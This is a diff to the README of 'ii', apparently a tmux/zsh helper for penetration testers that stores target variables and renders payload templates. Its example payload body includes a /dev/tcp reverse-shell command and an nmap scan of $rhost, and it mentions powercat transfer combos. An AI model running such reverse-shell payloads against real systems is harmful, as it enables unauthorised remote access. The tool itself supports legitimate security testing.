@@ -8,15 +8,14 @@
 ```text
 tmux session environment = shared source across panes
 current shell environment = values directly usable in the current pane
-payload file renderer = always reads fresh tmux session values
-payload input renderer = reads current shell first, then tmux session values
+payload renderer = reads current shell first, then tmux session values
 ```
 
 `ii s` writes to tmux and exports the value into the current shell. `ii l` loads
-tmux values into the current shell later. `ii p` renders from tmux directly, so
-another pane can render payload files without running `ii l`. `ii p --input`
-is different: it starts with shell variables visible in the current command
-context, then falls back to tmux.
+tmux values into the current shell later. `ii p` and `ii p --input` share the
+same render rules: a non-empty lowercase shell variable wins first, then the
+matching tmux `ii_` variable is used. This allows one-command shell overrides
+while preserving tmux as the shared fallback across panes.
 
 ## Commands
 
@@ -30,11 +29,13 @@ context, then falls back to tmux.
 | `ii load` | `ii l` | Load tmux variables into this shell without the internal `ii_` prefix |
 | `ii clip backend` | | Show or set clipboard backend |
 | `ii clip doctor` | | Diagnose clipboard behavior and suggest a backend |
-| `ii interactive` | `ii i` | Select variable names with fzf, preview values, edit, delete, add, and copy values |
+| `ii interactive` | `ii i` | Select variable names with fzf, preview values, edit, add, and copy values |
 | `ii ls [PATTERN]` | | List non-empty tmux variables as key/value blocks, optionally filtered by key |
-| `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, copy, and print a payload |
+| `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, print, and optionally write a payload |
+| `ii p --input [--copy] [-o [PATH]]` | | Render pasted input, optionally copy it, and optionally write it |
 | `ii unset NAME [...]` | `ii u NAME [...]` | Remove `ii_` variables from tmux and this shell |
 | `ii unset -a` | `ii u -a` | Prompt, then remove all `ii_` variables from the current tmux session |
+| `ii version` | `ii -v`, `ii --version` | Show installed version |
 | `ii help [COMMAND]` | `ii h [COMMAND]` | Show help |
 
 ## Basic Workflow
@@ -76,10 +77,12 @@ export II_EXPORT_CASE=both   # lhost and LHOST
 ~/.config/ii/ii.conf
 ```
 
-Use it for stable preferences such as shell export case:
+Use it for stable preferences such as shell export case and the `/www` helper
+root:
 
 ```zsh
 export II_EXPORT_CASE=lower
+export II_WWW_ROOT=/www
 ```
 
 To use a different config path, set `II_CONFIG_FILE` in `.zshrc` before loading
@@ -166,12 +169,11 @@ Keys:
 
 | Key | Action |
 | --- | --- |
-| `Enter` | Edit the selected variable |
-| `Ctrl-S` | Add a variable immediately |
-| `Ctrl-X` | Delete the selected variable |
-| `Ctrl-Y` | Copy selected existing values |
-| `Tab` | Mark multiple values for copy |
-| `Esc` / `Ctrl-C` | Abort |
+| `j` / `k` | Move selection |
+| `i` | Edit the selected variable |
+| `Enter` | Edit the selected variable, copy the value, and close |
+| `y` | Copy the selected value without closing |
+| `q` / `Esc` / `Ctrl-C` | Abort |
 
 Aborting while editing preserves the original value. A value is replaced only
 after confirming with Enter. Clearing a value and confirming stores an empty
@@ -181,6 +183,38 @@ value.
 variables into the current shell.
 
 ## Payloads
+
+### Render Rules
+
+Payload files and pasted input use the same renderer.
+
+Renderable placeholders:
+
+```text
+$name
+${name}
+${name:t}
+${II_NAME}
+II_NAME
+```
+
+All renderable names normalize to the same lowercase variable identity. For
+example, `$rhost`, `${rhost}`, `${II_RHOST}`, and bare `II_RHOST` all resolve
+as `rhost` / tmux `ii_rhost`.
+
+Resolution order:
+
+1. Non-empty lowercase shell variable in the current command context.
+2. Non-empty tmux session variable in the internal `ii_` namespace.
+3. Keep the original token unchanged.
+
+Shell-sourced values are reported in blue. Tmux/ii-sourced values are reported
+with normal text. Missing values are kept as their original tokens and reported
+in red.
+
+Uppercase shell variables such as `$RHOST` and `${RHOST}` are not rendered.
+PowerShell scope variables such as `$env:`, `$script:`, `$global:`, `$local:`,
+and `$private:` are also left unchanged.
 
 ### Payload Files
 
@@ -209,36 +243,55 @@ payloads/
     basic-alert
 ```
 
-Use `${II_NAME}` placeholders:
+Payload files can use `${II_NAME}` / bare `II_NAME` placeholders or lowercase
+shell-style placeholders:
 
 ```text
 /bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
+sudo nmap -p- -Pn -T4 $rhost
 ```
 
 Files under `payloads/script/` are for custom scripts. They may use
-`${II_NAME}` placeholders, or they may use literal shell variables such as
-`$rhost`. When no renderable `${II_*}` placeholder is present, `ii p` copies the
-script text as-is.
+`${II_NAME}` placeholders, or lowercase shell-style variables such as `$rhost`,
+`${file}`, and `${file:t}`.
+
+Combo payloads are multi-stage script payloads under `script/combo/`. Use names
+like `script/combo/trans/powercat-K2T-TLKC`, where `K2T` means Kali sends to
+target and `TLKC` means target listens while Kali connects. See
+[payload-schema.md](payload-schema.md) for the combo naming table and `# stage:`
+metadata convention.
 
 Payload files use a small plain-text schema:
 
 ```text
 # description: optional operator-facing description
-payload body with ${II_NAME} placeholders or literal lowercase shell variables
+payload body with ${II_NAME}, $name, ${name}, or ${name:t} placeholders
 ```
 
 For documentation and tooling, the logical payload object includes `$schema`,
 `path`, `description`, `body`, and `variables`. See
 [payload-schema.md](payload-schema.md).
 
-If a payload variable has not been assigned a non-empty tmux value, `ii p`
-renders a lowercase shell fallback such as `$rhost` so the copied command can
-still be expanded by the shell that runs it.
+`ii p` uses the shared render rules above. A first-line `# description: ...`
+metadata line is shown in preview but omitted from copied, printed, and written
+output.
 
-The payload selector shows a one-line rendered preview in the list. The selected
-payload preview reserves separate description and keys blocks around the body.
-A first-line `# description: ...` metadata line is shown in preview but omitted
-from copied output.
+The payload selector shows each path, a solid block delimiter, and a one-line
+template preview. It preserves the original tokens and highlights renderable
+tokens in green. The selected payload preview reserves a description block above
+the template body and shows selector controls and copy status in the footer.
+
+In the selector, `j` and `k` move between payloads. `y` copies the selected
+rendered payload without leaving the selector. `l` unfolds the selected script
+into a full preview and hides the filter input. `j` and `k` still move between
+scripts, Enter renders and outputs, and `q` aborts. `h` returns to the normal
+searchable selector.
+
+Render reports are printed when `ii p` leaves the selector. If you only use `y`
+and then abort, `ii` prints the last copied payload's report. If you use `y`
+and then Enter a different payload, `ii` prints the Enter payload's report
+first, then the last copied payload's report. Aborting without Enter or `y`
+prints nothing.
 
 Write the rendered payload to a file with `-o`:
 
@@ -267,16 +320,10 @@ ii p --input -o
 ii p --input -o ./payload.txt
 ```
 
-`ii p --input` reads until `.` is entered on its own line. It renders lowercase
-shell-style variables such as `$lhost`, `${file}`, and `${file:t}`. Current
-shell variables win; if the exact lowercase shell variable does not exist, ii
-falls back to the tmux session value. Missing variables render as empty and are
-reported in red. Shell-sourced variables are reported in blue.
-
-Uppercase variables are left unchanged. PowerShell scope variables such as
-`$env:`, `$script:`, `$global:`, `$local:`, and `$private:` are also left
-unchanged. The terminal output starts with a separator for tmux copy-mode, but
-`--copy` copies only the rendered body.
+`ii p --input` reads until `.` is entered on its own line and uses the shared
+render rules above. The terminal output prints the render report first, then a
+separator for tmux copy-mode, then the rendered body. `--copy` copies only the
+rendered body.
 
 `-o` writes the rendered body to a file while keeping the normal terminal
 output. It follows the same path rules as payload file output, including the
@@ -337,4 +384,11 @@ Override it only if you keep payloads somewhere else:
 
 ```zsh
 export II_PAYLOAD_DIR="$HOME/.config/ii/payloads"
+```
+
+`ii p -www ...` uses `/www` by default. Override it in your ii config when your
+web root lives elsewhere:
+
+```zsh
+export II_WWW_ROOT="$HOME/www"
 ```
